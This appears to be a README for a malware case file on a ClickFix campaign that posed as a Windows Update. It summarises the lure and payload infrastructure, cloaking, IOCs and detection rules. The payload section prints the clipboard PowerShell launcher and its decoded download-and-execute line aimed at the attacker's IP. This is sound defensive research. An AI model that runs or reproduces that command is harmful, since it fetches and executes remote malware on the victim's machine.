# ClickFix: fake Windows Update behind dateseni.su

Case file for a ClickFix campaign that disguised itself as a Windows Update and
asked the visitor to open PowerShell and paste a Base64 launcher.

The lure is dead. The payload server was still cloaking on the day of analysis.

## Read

| File | What it is |
|---|---|
| [`REPORT.md`](REPORT.md) | Full technical case file, written in investigation order |
| [`Medium-Article.docx`](Medium-Article.docx) | Article with images, title and tags, ready to publish |
| [`MEDIUM-ARTICLE.md`](MEDIUM-ARTICLE.md) | Same article as markdown |
| [`iocs.csv`](iocs.csv) | Indicators with context and confidence |
| [`screenshots/`](screenshots) | Ten real captures (live site, CT logs, sandbox, Shodan) |
| [`evidence/`](evidence) | Raw data, one file per source, including dead ends |
| [`detections/`](detections) | Sigma rules and KQL hunts |

## The payload

Delivered on the clipboard:

```
iex([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('...')))
```

Decoded, one layer:

```
Invoke-WebRequest 'http://166.1.89.91/zap/' -UseBasicParsing | Invoke-Expression
```

Fileless download and execute. The second stage was never retrieved.

## Findings

- Lure `dateseni.su` (Frankfurt, AS214351) and payload `166.1.89.91` (New York,
  AS395839) are unrelated infrastructure on unrelated providers.
- The lure's certificate covers `mail`, `owa` and `autodiscover`, which means it
  was built as a mail phishing kit, not just a redirect.
- Both endpoints cloak. The archive holds a redirect to an adult site; the
  sandbox submission was sent to Google from a German node.
- The lure is retired: 404 on the campaign path, no listener on 443, root
  serving the hosting placeholder.
- The payload host still answers `302 -> google.com` with Apache 2.4.52.
- Neither indicator appears in OTX, and GreyNoise has not seen either host scan.

## Method and limits

Static analysis and passive OSINT. The payload was never executed and the second
stage was never downloaded. Live checks were TCP connects, one GET per web path,
and one HEAD request. Where a source was unavailable (abuse.ch API key,
AbuseIPDB bot block, urlscan result API login), the report says so.

`powershell.txt` is the original note and was left as captured.

## Rebuild the docx

```
python build_docx.py
```
